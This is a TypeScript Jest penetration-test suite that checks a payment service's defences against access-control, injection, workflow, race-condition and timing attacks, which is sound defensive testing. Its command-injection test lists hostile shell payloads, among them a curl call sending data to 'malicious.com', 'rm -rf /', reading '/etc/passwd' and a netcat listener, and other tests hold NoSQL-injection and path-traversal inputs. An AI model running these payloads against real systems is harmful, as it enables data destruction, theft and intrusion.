/**
 * Penetration Testing Suite
 * 
 * Specialized penetration testing scenarios for payment systems:
 * - OWASP Top 10 vulnerability testing
 * - Business logic bypass attempts
 * - Authentication and session management attacks
 * - Input validation and sanitization testing
 * - API security boundary testing
 * - Race condition and timing attack testing
 */

import { getSupabaseClient } from '../../src/config/database';
import * as crypto from 'crypto';
import axios from 'axios';
import { performance } from 'perf_hooks';

// Import services for testing
import { PaymentService } from '../../src/services/payment.service';
import { TossPaymentsService } from '../../src/services/toss-payments.service';
import { AuthService } from '../../src/services/auth-analytics.service';
import { UserService } from '../../src/services/user.service';
import { logger } from '../../src/utils/logger';

const TEST_SERVER_BASE_URL = process.env.TEST_SERVER_URL || 'http://localhost:3000';
const PENETRATION_TEST_TIMEOUT = 90000; // 90 seconds for complex penetration tests

describe('Penetration Testing Suite', () => {
  let supabase: any;
  let paymentService: PaymentService;
  let tossPaymentsService: TossPaymentsService;
  let userService: UserService;

  // Test data
  let testUser: any;
  let testShop: any;
  let testService: any;

  beforeAll(async () => {
    supabase = getSupabaseClient();
    
    // Initialize services
    paymentService = new PaymentService();
    tossPaymentsService = new TossPaymentsService();
    userService = new UserService();

    // Create test data
    const testUserId = crypto.randomUUID();
    const testShopId = crypto.randomUUID();
    const testServiceId = crypto.randomUUID();

    // Create test user
    const { data: insertedUser, error: userError } = await supabase
      .from('users')
      .insert({
        id: testUserId,
        email: `pentest-${Date.now()}@test.com`,
        name: 'Penetration Test User',
        phone_number: '+821012345678',
        status: 'active',
        created_at: new Date().toISOString()
      })
      .select()
      .single();

    if (userError) {
      throw new Error(`Failed to create test user: ${userError.message}`);
    }
    testUser = insertedUser;

    // Create test shop
    const { data: insertedShop, error: shopError } = await supabase
      .from('shops')
      .insert({
        id: testShopId,
        name: 'Penetration Test Shop',
        owner_id: testUser.id,
        address: 'Test Address',
        phone_number: '+821087654321',
        status: 'active',
        created_at: new Date().toISOString()
      })
      .select()
      .single();

    if (shopError) {
      throw new Error(`Failed to create test shop: ${shopError.message}`);
    }
    testShop = insertedShop;

    // Create test service
    const { data: insertedService, error: serviceError } = await supabase
      .from('services')
      .insert({
        id: testServiceId,
        shop_id: testShop.id,
        name: 'Penetration Test Service',
        price: 50000,
        deposit_amount: 10000,
        duration_minutes: 60,
        status: 'active',
        created_at: new Date().toISOString()
      })
      .select()
      .single();

    if (serviceError) {
      throw new Error(`Failed to create test service: ${serviceError.message}`);
    }
    testService = insertedService;

    logger.info('Penetration test setup completed', {
      testUser: testUser.id,
      testShop: testShop.id,
      testService: testService.id
    });
  }, 30000);

  afterAll(async () => {
    // Clean up test data
    if (testService?.id) {
      await supabase.from('services').delete().eq('id', testService.id);
    }
    if (testShop?.id) {
      await supabase.from('shops').delete().eq('id', testShop.id);
    }
    if (testUser?.id) {
      await supabase.from('users').delete().eq('id', testUser.id);
    }
  }, 10000);

  describe('OWASP Top 10 Vulnerability Tests', () => {
    describe('A01: Broken Access Control', () => {
      it('should prevent horizontal privilege escalation', async () => {
        // Create another user
        const otherUserId = crypto.randomUUID();
        const { data: otherUser } = await supabase
          .from('users')
          .insert({
            id: otherUserId,
            email: `other-pentest-${Date.now()}@test.com`,
            name: 'Other Penetration Test User',
            phone_number: '+821087654322',
            status: 'active',
            created_at: new Date().toISOString()
          })
          .select()
          .single();

        // Attempt to access other user's payment data
        try {
          const unauthorizedAccess = await paymentService.getUserPayments(otherUser.id, {
            requestingUserId: testUser.id // Different user trying to access
          });

          // Should either fail or return empty/filtered results
          if (unauthorizedAccess) {
            expect(unauthorizedAccess.length).toBe(0);
          }
        } catch (error) {
          // Expected behavior - should reject unauthorized access
          expect(error).toBeDefined();
          logger.info('Horizontal privilege escalation properly blocked', {
            error: error instanceof Error ? error.message : 'Unknown error'
          });
        }

        // Clean up
        await supabase.from('users').delete().eq('id', otherUserId);
      }, PENETRATION_TEST_TIMEOUT);

      it('should prevent vertical privilege escalation', async () => {
        // Attempt to perform admin actions as regular user
        const adminActions = [
          { action: 'refund_payment', params: { paymentId: 'any', amount: 50000 } },
          { action: 'cancel_all_payments', params: { userId: testUser.id } },
          { action: 'modify_payment_status', params: { paymentId: 'any', status: 'completed' } },
          { action: 'access_admin_dashboard', params: {} }
        ];

        for (const adminAction of adminActions) {
          try {
            // Attempt admin action as regular user
            const result = await paymentService.performAdminAction(
              adminAction.action,
              adminAction.params,
              { userId: testUser.id, role: 'user' } // Regular user context
            );

            // Should not succeed for regular users
            if (result) {
              expect(result.authorized).toBe(false);
            }
          } catch (error) {
            // Expected behavior - should reject unauthorized admin actions
            expect(error).toBeDefined();
            logger.info('Vertical privilege escalation properly blocked', {
              action: adminAction.action,
              error: error instanceof Error ? error.message : 'Unknown error'
            });
          }
        }
      }, PENETRATION_TEST_TIMEOUT);

      it('should prevent direct object reference attacks', async () => {
        // Create a payment
        const payment = await paymentService.createPayment({
          userId: testUser.id,
          amount: 50000,
          orderId: `direct_ref_test_${Date.now()}`,
          paymentMethod: 'CARD'
        });

        if (payment) {
          // Attempt to access payment with modified IDs
          const maliciousIds = [
            payment.id.replace(/.$/, '0'), // Change last character
            payment.id.replace(/.$/, '1'),
            payment.id + '1', // Append character
            payment.id.substring(0, payment.id.length - 1), // Remove character
            'admin_payment_id',
            '../../../admin/payments',
            '../../sensitive_data'
          ];

          for (const maliciousId of maliciousIds) {
            try {
              const unauthorizedPayment = await paymentService.getPaymentById(maliciousId, {
                requestingUserId: testUser.id
              });

              // Should either fail or return null/empty
              if (unauthorizedPayment) {
                expect(unauthorizedPayment.id).not.toBe(maliciousId);
                expect(unauthorizedPayment.user_id).toBe(testUser.id); // Should only return own payments
              }
            } catch (error) {
              // Expected behavior - should reject invalid IDs
              expect(error).toBeDefined();
            }
          }
        }
      }, PENETRATION_TEST_TIMEOUT);
    });

    describe('A02: Cryptographic Failures', () => {
      it('should use strong encryption for sensitive data', async () => {
        // Test payment data encryption
        const sensitivePaymentData = {
          userId: testUser.id,
          amount: 100000,
          orderId: `crypto_test_${Date.now()}`,
          paymentMethod: 'CARD',
          cardToken: 'test_card_token_12345',
          metadata: {
            sensitiveInfo: 'confidential_data',
            personalData: 'private_information'
          }
        };

        const payment = await paymentService.createPayment(sensitivePaymentData);

        if (payment) {
          // Verify sensitive data is encrypted in database
          const { data: rawPayment } = await supabase
            .from('payments')
            .select('*')
            .eq('id', payment.id)
            .single();

          if (rawPayment) {
            const paymentString = JSON.stringify(rawPayment);
            
            // Sensitive data should not appear in plain text
            expect(paymentString).not.toContain('test_card_token_12345');
            expect(paymentString).not.toContain('confidential_data');
            expect(paymentString).not.toContain('private_information');
            
            // Should have encrypted fields or hashed values
            expect(rawPayment.encrypted_data || rawPayment.card_token_hash).toBeDefined();
          }
        }
      }, PENETRATION_TEST_TIMEOUT);

      it('should prevent weak cryptographic implementations', async () => {
        // Test for weak hashing algorithms
        const testData = 'sensitive_payment_data';
        
        // These should NOT be used for sensitive data
        const weakHashes = [
          crypto.createHash('md5').update(testData).digest('hex'),
          crypto.createHash('sha1').update(testData).digest('hex')
        ];

        // Verify system doesn't use weak hashing
        const { data: systemConfig } = await supabase
          .from('system_config')
          .select('*')
          .eq('key', 'encryption_settings');

        if (systemConfig && systemConfig.length > 0) {
          const configString = JSON.stringify(systemConfig);
          expect(configString).not.toContain('md5');
          expect(configString).not.toContain('sha1');
          expect(configString).not.toContain('des');
          expect(configString).not.toContain('rc4');
        }

        // Test for proper key management
        const encryptionKey = process.env.ENCRYPTION_KEY;
        if (encryptionKey) {
          expect(encryptionKey.length).toBeGreaterThanOrEqual(32); // At least 256 bits
          expect(encryptionKey).not.toBe('default_key');
          expect(encryptionKey).not.toBe('12345');
          expect(encryptionKey).not.toBe('password');
        }
      }, PENETRATION_TEST_TIMEOUT);
    });

    describe('A03: Injection Attacks', () => {
      it('should prevent NoSQL injection in database queries', async () => {
        const noSqlInjectionPayloads = [
          { "$ne": null },
          { "$gt": "" },
          { "$where": "this.amount > 0" },
          { "$regex": ".*" },
          { "$or": [{"amount": {"$gt": 0}}] },
          "'; return db.payments.find(); //",
          { "$eval": "function() { return true; }" }
        ];

        for (const payload of noSqlInjectionPayloads) {
          try {
            // Attempt NoSQL injection in payment search
            const maliciousQuery = {
              userId: payload,
              amount: payload,
              status: payload
            };

            const result = await paymentService.searchPayments(maliciousQuery);
            
            // Should either fail or return safely filtered results
            if (result) {
              expect(Array.isArray(result)).toBe(true);
              // Should not return all payments (which would indicate successful injection)
              expect(result.length).toBeLessThan(1000);
            }
          } catch (error) {
            // Expected behavior - should reject malicious queries
            expect(error).toBeDefined();
            logger.info('NoSQL injection properly blocked', {
              payload: JSON.stringify(payload),
              error: error instanceof Error ? error.message : 'Unknown error'
            });
          }
        }
      }, PENETRATION_TEST_TIMEOUT);

      it('should prevent command injection in system operations', async () => {
        const commandInjectionPayloads = [
          '; ls -la',
          '| cat /etc/passwd',
          '&& rm -rf /',
          '`whoami`',
          '$(id)',
          '; curl http://malicious.com/steal-data',
          '| nc -l 4444',
          '; python -c "import os; os.system(\'ls\')"'
        ];

        for (const payload of commandInjectionPayloads) {
          try {
            // Attempt command injection in file operations
            const maliciousRequest = {
              userId: testUser.id,
              fileName: `receipt_${payload}.pdf`,
              operation: 'generate_receipt'
            };

            const result = await paymentService.generatePaymentReceipt(maliciousRequest);
            
            if (result) {
              // Verify filename was sanitized
              expect(result.fileName).not.toContain(';');
              expect(result.fileName).not.toContain('|');
              expect(result.fileName).not.toContain('&');
              expect(result.fileName).not.toContain('`');
              expect(result.fileName).not.toContain('$');
            }
          } catch (error) {
            // Expected behavior - should reject malicious filenames
            expect(error).toBeDefined();
            logger.info('Command injection properly blocked', {
              payload,
              error: error instanceof Error ? error.message : 'Unknown error'
            });
          }
        }
      }, PENETRATION_TEST_TIMEOUT);
    });

    describe('A04: Insecure Design', () => {
      it('should implement proper business logic validation', async () => {
        // Test business logic bypass attempts
        const businessLogicAttacks = [
          {
            description: 'Negative amount payment',
            paymentData: { amount: -50000, orderId: `negative_${Date.now()}` }
          },
          {
            description: 'Zero amount payment',
            paymentData: { amount: 0, orderId: `zero_${Date.now()}` }
          },
          {
            description: 'Extremely large amount',
            paymentData: { amount: 999999999999, orderId: `large_${Date.now()}` }
          },
          {
            description: 'Duplicate order ID',
            paymentData: { amount: 50000, orderId: 'duplicate_order_id' }
          }
        ];

        for (const attack of businessLogicAttacks) {
          try {
            const maliciousPayment = {
              userId: testUser.id,
              paymentMethod: 'CARD',
              ...attack.paymentData
            };

            const result = await paymentService.createPayment(maliciousPayment);
            
            if (result) {
              // If it succeeds, verify business rules were enforced
              expect(result.amount).toBeGreaterThan(0);
              expect(result.amount).toBeLessThan(10000000); // 10M KRW max
              expect(result.order_id).toBeTruthy();
            }
          } catch (error) {
            // Expected behavior - should reject invalid business logic
            expect(error).toBeDefined();
            logger.info('Business logic attack properly blocked', {
              attack: attack.description,
              error: error instanceof Error ? error.message : 'Unknown error'
            });
          }
        }
      }, PENETRATION_TEST_TIMEOUT);

      it('should prevent payment workflow manipulation', async () => {
        // Create a payment in pending state
        const payment = await paymentService.createPayment({
          userId: testUser.id,
          amount: 50000,
          orderId: `workflow_test_${Date.now()}`,
          paymentMethod: 'CARD'
        });

        if (payment) {
          // Attempt to manipulate payment workflow
          const workflowAttacks = [
            { status: 'completed', description: 'Skip to completed' },
            { status: 'refunded', description: 'Direct refund without payment' },
            { amount: 1, description: 'Change amount after creation' },
            { user_id: 'different_user', description: 'Change ownership' }
          ];

          for (const attack of workflowAttacks) {
            try {
              const result = await paymentService.updatePaymentStatus(payment.id, {
                ...attack,
                requestingUserId: testUser.id
              });

              if (result) {
                // Verify workflow rules were enforced
                if (attack.status === 'completed') {
                  expect(result.status).not.toBe('completed'); // Should require proper flow
                }
                if (attack.amount) {
                  expect(result.amount).toBe(payment.amount); // Amount shouldn't change
                }
                if (attack.user_id) {
                  expect(result.user_id).toBe(testUser.id); // Ownership shouldn't change
                }
              }
            } catch (error) {
              // Expected behavior - should reject workflow manipulation
              expect(error).toBeDefined();
              logger.info('Workflow manipulation properly blocked', {
                attack: attack.description,
                error: error instanceof Error ? error.message : 'Unknown error'
              });
            }
          }
        }
      }, PENETRATION_TEST_TIMEOUT);
    });

    describe('A05: Security Misconfiguration', () => {
      it('should not expose sensitive configuration', async () => {
        // Test for exposed configuration endpoints
        const configEndpoints = [
          '/api/config',
          '/api/admin/config',
          '/config.json',
          '/.env',
          '/api/debug',
          '/api/status',
          '/health',
          '/metrics'
        ];

        for (const endpoint of configEndpoints) {
          try {
            const response = await axios.get(`${TEST_SERVER_BASE_URL}${endpoint}`, {
              timeout: 5000
            });

            if (response.status === 200 && response.data) {
              const responseString = JSON.stringify(response.data);
              
              // Should not expose sensitive information
              expect(responseString).not.toContain('password');
              expect(responseString).not.toContain('secret');
              expect(responseString).not.toContain('key');
              expect(responseString).not.toContain('token');
              expect(responseString).not.toContain('database');
              expect(responseString).not.toContain('api_key');
              
              logger.info('Configuration endpoint accessible but sanitized', {
                endpoint,
                hasData: !!response.data
              });
            }
          } catch (error) {
            // Expected for most endpoints - should not be publicly accessible
            logger.info('Configuration endpoint properly protected', { endpoint });
          }
        }
      }, PENETRATION_TEST_TIMEOUT);

      it('should have proper error handling without information disclosure', async () => {
        // Test error message information disclosure
        const errorTriggers = [
          { path: '/api/payments/invalid-id', method: 'GET' },
          { path: '/api/payments', method: 'POST', data: { invalid: 'data' } },
          { path: '/api/webhooks/invalid-webhook', method: 'POST' },
          { path: '/api/users/999999999', method: 'GET' }
        ];

        for (const trigger of errorTriggers) {
          try {
            const response = await axios({
              method: trigger.method,
              url: `${TEST_SERVER_BASE_URL}${trigger.path}`,
              data: trigger.data,
              timeout: 5000
            });

            // If it succeeds, check response doesn't leak info
            if (response.data) {
              const responseString = JSON.stringify(response.data);
              expect(responseString).not.toContain('stack trace');
              expect(responseString).not.toContain('file path');
              expect(responseString).not.toContain('database error');
              expect(responseString).not.toContain('internal error');
            }
          } catch (error) {
            if (axios.isAxiosError(error) && error.response) {
              const errorString = JSON.stringify(error.response.data);
              
              // Error messages should not expose sensitive information
              expect(errorString).not.toContain('stack trace');
              expect(errorString).not.toContain('/src/');
              expect(errorString).not.toContain('database');
              expect(errorString).not.toContain('internal');
              expect(errorString).not.toContain('secret');
            }
          }
        }
      }, PENETRATION_TEST_TIMEOUT);
    });
  });

  describe('Race Condition and Timing Attack Tests', () => {
    it('should prevent payment double-spending through race conditions', async () => {
      // Create a payment with limited balance
      const userBalance = 100000; // 100,000 KRW
      const paymentAmount = 80000; // 80,000 KRW each
      
      // Simulate concurrent payment attempts that would exceed balance
      const concurrentPayments = Array.from({ length: 5 }, (_, index) => 
        paymentService.createPayment({
          userId: testUser.id,
          amount: paymentAmount,
          orderId: `race_condition_${Date.now()}_${index}`,
          paymentMethod: 'CARD'
        }).catch(error => ({ error: error.message }))
      );

      const results = await Promise.allSettled(concurrentPayments);
      const successful = results.filter(result => 
        result.status === 'fulfilled' && !result.value?.error
      );

      // Should only allow payments within balance limits
      expect(successful.length).toBeLessThanOrEqual(1); // Only one should succeed
      
      logger.info('Race condition test completed', {
        totalAttempts: concurrentPayments.length,
        successful: successful.length,
        userBalance,
        paymentAmount
      });
    }, PENETRATION_TEST_TIMEOUT);

    it('should prevent timing attacks on authentication', async () => {
      const validUser = testUser.email;
      const invalidUser = 'nonexistent@test.com';
      const password = 'test_password';

      // Measure timing for valid vs invalid users
      const timingTests = [
        { email: validUser, description: 'Valid user' },
        { email: invalidUser, description: 'Invalid user' },
        { email: validUser, description: 'Valid user (repeat)' },
        { email: invalidUser, description: 'Invalid user (repeat)' }
      ];

      const timings: number[] = [];

      for (const test of timingTests) {
        const startTime = performance.now();
        
        try {
          await userService.authenticateUser({
            email: test.email,
            password: password
          });
        } catch (error) {
          // Expected for invalid users
        }
        
        const endTime = performance.now();
        const duration = endTime - startTime;
        timings.push(duration);
        
        logger.info('Authentication timing test', {
          description: test.description,
          duration: `${duration.toFixed(2)}ms`
        });
      }

      // Timing differences should not be significant enough to leak information
      const maxTiming = Math.max(...timings);
      const minTiming = Math.min(...timings);
      const timingDifference = maxTiming - minTiming;
      
      // Timing difference should be within reasonable bounds (not revealing user existence)
      expect(timingDifference).toBeLessThan(1000); // Less than 1 second difference
    }, PENETRATION_TEST_TIMEOUT);

    it('should handle concurrent webhook processing safely', async () => {
      const webhookPayload = {
        paymentKey: `concurrent_webhook_${Date.now()}`,
        orderId: `concurrent_order_${Date.now()}`,
        status: 'DONE',
        totalAmount: 50000
      };

      // Send multiple identical webhooks concurrently
      const concurrentWebhooks = Array.from({ length: 10 }, () => 
        tossPaymentsService.processWebhook(webhookPayload).catch(error => ({ error: error.message }))
      );

      const results = await Promise.allSettled(concurrentWebhooks);
      const successful = results.filter(result => 
        result.status === 'fulfilled' && !result.value?.error
      );

      // Only one webhook should be processed (idempotency)
      expect(successful.length).toBeLessThanOrEqual(1);
      
      // Verify idempotency was enforced
      const { data: webhookLogs } = await supabase
        .from('webhook_logs')
        .select('*')
        .eq('payment_key', webhookPayload.paymentKey);

      expect(webhookLogs).toBeDefined();
      if (webhookLogs && webhookLogs.length > 0) {
        const processedLogs = webhookLogs.filter(log => log.processed === true);
        expect(processedLogs.length).toBeLessThanOrEqual(1);
      }
    }, PENETRATION_TEST_TIMEOUT);
  });

  describe('Business Logic Security Tests', () => {
    it('should prevent payment amount manipulation during processing', async () => {
      // Create a payment
      const originalAmount = 50000;
      const payment = await paymentService.createPayment({
        userId: testUser.id,
        amount: originalAmount,
        orderId: `amount_manipulation_${Date.now()}`,
        paymentMethod: 'CARD'
      });

      if (payment) {
        // Attempt to manipulate amount during processing
        const manipulationAttempts = [
          { newAmount: 1, description: 'Reduce to minimum' },
          { newAmount: 999999999, description: 'Increase to maximum' },
          { newAmount: -originalAmount, description: 'Make negative' },
          { newAmount: 0, description: 'Set to zero' }
        ];

        for (const attempt of manipulationAttempts) {
          try {
            // Attempt direct database manipulation
            const { error } = await supabase
              .from('payments')
              .update({ amount: attempt.newAmount })
              .eq('id', payment.id);

            if (!error) {
              // If direct update succeeded, verify business logic prevents processing
              const updatedPayment = await paymentService.processPayment(payment.id);
              
              if (updatedPayment) {
                // Should either reject or restore original amount
                expect(updatedPayment.amount).toBe(originalAmount);
              }
            }
          } catch (error) {
            // Expected behavior - should prevent manipulation
            expect(error).toBeDefined();
            logger.info('Amount manipulation properly blocked', {
              attempt: attempt.description,
              error: error instanceof Error ? error.message : 'Unknown error'
            });
          }
        }
      }
    }, PENETRATION_TEST_TIMEOUT);

    it('should enforce proper refund business rules', async () => {
      // Create and complete a payment
      const payment = await paymentService.createPayment({
        userId: testUser.id,
        amount: 100000,
        orderId: `refund_test_${Date.now()}`,
        paymentMethod: 'CARD'
      });

      if (payment) {
        // Mark as completed
        await paymentService.updatePaymentStatus(payment.id, {
          status: 'completed',
          requestingUserId: testUser.id
        });

        // Test refund business rule violations
        const refundViolations = [
          { amount: 150000, description: 'Refund more than paid' },
          { amount: -50000, description: 'Negative refund amount' },
          { amount: 0, description: 'Zero refund amount' },
          { reason: 'invalid_reason', description: 'Invalid refund reason' }
        ];

        for (const violation of refundViolations) {
          try {
            const refundRequest = {
              paymentId: payment.id,
              amount: violation.amount || 50000,
              reason: violation.reason || 'customer_request',
              requestedBy: testUser.id
            };

            const refundResult = await paymentService.processRefund(refundRequest);
            
            if (refundResult) {
              // If refund succeeds, verify business rules were enforced
              expect(refundResult.amount).toBeGreaterThan(0);
              expect(refundResult.amount).toBeLessThanOrEqual(payment.amount);
              expect(refundResult.reason).toMatch(/customer_request|service_issue|technical_error/);
            }
          } catch (error) {
            // Expected behavior - should reject invalid refunds
            expect(error).toBeDefined();
            logger.info('Refund violation properly blocked', {
              violation: violation.description,
              error: error instanceof Error ? error.message : 'Unknown error'
            });
          }
        }
      }
    }, PENETRATION_TEST_TIMEOUT);
  });
});

